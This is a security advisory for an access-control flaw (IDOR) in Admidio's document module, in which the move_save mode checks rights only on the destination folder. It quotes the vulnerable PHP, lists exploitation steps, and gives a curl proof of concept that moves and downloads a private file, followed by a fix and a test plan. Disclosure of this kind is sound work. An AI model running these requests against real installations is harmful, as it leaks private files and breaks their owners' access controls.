# [H] Admidio has IDOR in `documents-files.php` `mode=move_save` that lets any folder-uploader exfiltrate files from private folders

## Summary
Severity: High
Advisory: GHSA-x628-457g-2pw9
CVE: CVE-2026-47231
CWE: CWE-639, CWE-863
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-x628-457g-2pw9
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=0 <5.0.10

## Details
## Summary

`modules/documents-files.php` gates state-changing modes by checking that the actor has `hasUploadRight()` on the URL parameter `folder_uuid`. The `move_save` handler then operates on a *separate* URL parameter `file_uuid` and calls `File::moveToFolder($destFolderUUID)`. `File::moveToFolder()` checks the upload right on the **destination** folder but never on the **source** folder containing the file. As a result, any user who can upload to any single folder can move any file from any other folder — including private folders to which they have no view rights — into a folder they control, and then download it. Confidentiality is broken (private file contents leak) and integrity is broken (the file is removed from the original location).

## Details

### Vulnerable Code

`modules/documents-files.php:79-89` — top-level rights check binds to URL `folder_uuid`:

```php
if ($getMode != 'list' && $getMode != 'download') {
    // check the rights of the current folder
    // user must be administrator or must have the right to upload files
    $folder = new Folder($gDb);
    $folder->getFolderForDownload($getFolderUUID);

    if (!$folder->hasUploadRight()) {
        $gMessage->show($gL10n->get('SYS_NO_RIGHTS'));
        // => EXIT
    }
}
```

`modules/documents-files.php:187-204` — the `move_save` branch loads the file by UUID without revalidating the file's actual parent folder:

```php
case 'move_save':
    $documentsFilesMoveForm = $gCurrentSession->getFormObject($_POST['adm_csrf_token']);
    $formValues = $documentsFilesMoveForm->validate($_POST);

    if ($getFileUUID !== '') {
        $file = new File($gDb);
        $file->readDataByUuid($getFileUUID);                       // <-- no permission check on the file's source folder
        $file->moveToFolder($formValues['adm_destination_folder_uuid']);
    } else {
        $folder = new Folder($gDb);
        $folder->readDataByUuid($getFolderUUID);
        $folder->moveToFolder($formValues['adm_destination_folder_uuid']);
    }

    $gNavigation->deleteLastUrl();
    echo json_encode(array('status' => 'success', 'url' => $gNavigation->getUrl()));
    break;
```

`src/Documents/Entity/File.php:212-223` — `moveToFolder` checks only the destination:

```php
public function moveToFolder(string $destFolderUUID)
{
    $folder = new Folder($this->db);
    $folder->readDataByUuid($destFolderUUID);

    if ($folder->hasUploadRight()) {                               // <-- destination only
        FileSystemUtils::moveFile($this->getFullFilePath(),
                                  $folder->getFullFolderPath() . '/' . $this->getValue('fil_name'));
        $this->setValue('fil_fol_id', $folder->getValue('fol_id'));
        $this->save();
    }
}
```

There is no check that the actor has any right (view, edit, upload) on the folder that *currently* contains the file. The `file_uuid` URL parameter is independent of `folder_uuid`, so an attacker can pass `folder_uuid=<a folder I can upload to>` together with `file_uuid=<a file in a folder I cannot read>`. The top-level rights check passes; the destination check passes; the file is moved.

### Exploitation Primitive

1. Attacker user `lowuser` holds `folder_upload` on a single Documents folder `public_uploadable` (UUID `c41a99c0-…`). They have no view or edit rights on `private_admin_only` (UUID `db1f71b9-…`, which is a role-restricted folder containing `private_to_delete.txt`, UUID `559ed352-…`).
2. Render the move form with mismatched UUIDs to register a form key in the session:
   `GET /modules/documents-files.php?mode=move&folder_uuid=c41a99c0-…&file_uuid=559ed352-…`
3. Submit `move_save` with the same mismatch:
   `POST /modules/documents-files.php?mode=move_save&folder_uuid=c41a99c0-…&file_uuid=559ed352-…` with `adm_csrf_token=<from step 2>` and `adm_destination_folder_uuid=c41a99c0-…`. Server replies `{"status":"success"}`. The `private_to_delete.txt` row in `adm_files` now has `fil_fol_id` pointing at the public-uploadable folder.
4. Download the file from its new (publicly-accessible) location:
   `GET /modules/documents-files.php?mode=download&file_uuid=559ed352-…` returns the bytes of `private_to_delete.txt`.

## PoC

Tested live on HEAD `c5cde53`. The trace below is the agent-captured run; I verified the code paths against the source listed above.

```
# 0. starting state — lowuser has upload right ONLY on c41a99c0-… (public_uploadable)
$ curl -sb $cookie http://127.0.0.1:8085/modules/documents-files.php?folder_uuid=db1f71b9-…
"You do not have the required permission to perform this action."

# 1. render the move form using the public folder UUID (where lowuser has upload right)
#    paired with the PRIVATE file UUID
$ curl -sb $cookie \
    "http://127.0.0.1:8085/modules/documents-files.php?mode=move&folder_uuid=c41a99c0-…&file_uuid=559ed352-…"
# form rendered, CSRF token X is now in session

# 2. submit move_save with the same param mismatch
$ curl -sb $cookie -X POST \
    "http://127.0.0.1:8085/modules/documents-files.php?mode=move_save&folder_uuid=c41a99c0-…&file_uuid=559ed352-…" \
    -d "adm_csrf_token=X&adm_destination_folder_uuid=c41a99c0-…"
{"status":"success", "url":"…"}

# 3. download the leaked file
$ curl -sb $cookie \
    "http://127.0.0.1:8085/modules/documents-files.php?mode=download&file_uuid=559ed352-…"
private_to_delete_data
```

The DB record for the file now points at the attacker's folder (`fil_fol_id` updated), and the file has been physically moved on disk by `FileSystemUtils::moveFile`.

## Impact

Any user with `folder_upload` right on a single Documents folder gains:

* **Read access** to every file in private folders — admin-only documents, board-only files, leader-only resources, role-restricted attachments — by moving them into a folder the attacker owns and then downloading.
* **Write/destruction primitive** — the file is no longer in its original folder. Users who depended on the file at its legitimate location can no longer find it. The moved file's permissions are now those of the destination, so previously-restricted content can be exposed to other low-privilege users (whoever else has view rights on the destination folder).

In multi-tenant Admidio installations where one shared deployment hosts multiple groups (e.g., a federation of associations), the bug crosses organisation-internal Documents trust boundaries: a member of group A holding `folder_upload` on group A's public folder can lift any private file from group B.

`PR:L` reflects that the actor must hold a single Documents upload right (a routinely-granted role attribute, not an administrator privilege). `S:U` because the impact stays inside the Documents module's own access-control model, but the access boundary it bypasses is the one that operators most rely on. `C:H` because confidentiality of any file in any private folder is broken; `I:H` because file location is mutated.

## Recommended Fix

`File::moveToFolder()` must check that the actor has upload right (or at least edit / move right) on the file's *source* folder, not just on the destination. The minimal patch:

```php
// src/Documents/Entity/File.php
public function moveToFolder(string $destFolderUUID)
{
    // re-read the source folder this file currently lives in, and check rights on it
    $sourceFolder = new Folder($this->db);
    $sourceFolder->readData($this->getValue('fil_fol_id'));
    if (!$sourceFolder->hasUploadRight()) {
        throw new Exception('SYS_NO_RIGHTS');
    }

    $destFolder = new Folder($this->db);
    $destFolder->readDataByUuid($destFolderUUID);

    if (!$destFolder->hasUploadRight()) {
        throw new Exception('SYS_NO_RIGHTS');
    }

    FileSystemUtils::moveFile($this->getFullFilePath(),
                              $destFolder->getFullFolderPath() . '/' . $this->getValue('fil_name'));
    $this->setValue('fil_fol_id', $destFolder->getValue('fol_id'));
    $this->save();
}
```

Equivalently, `documents-files.php` `case 'move_save'` should resolve the file's actual parent folder before the operation and call `getFileForDownload()` plus `hasUploadRight()` on that parent. The same fix is needed for `Folder::moveToFolder()` (the move-folder path is identical in shape).

A regression test should:
1. Create user `lowuser` with upload right only on folder A.
2. Place a private file in folder B with no rights for `lowuser`.
3. As `lowuser`, render `mode=move` with `folder_uuid=A&file_uuid=<B's file>`, then `POST mode=move_save` with the same.
4. Assert the response is `SYS_NO_RIGHTS` and the file's `fil_fol_id` is unchanged.

## Related

`mode=file_rename_save` shares the same root cause and is filed separately (`06-documents-cross-folder-rename-idor.md`); both bugs flow from the top-level rights check binding to URL `folder_uuid` rather than the file's actual parent.

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-x628-457g-2pw9
- https://github.com/Admidio/admidio
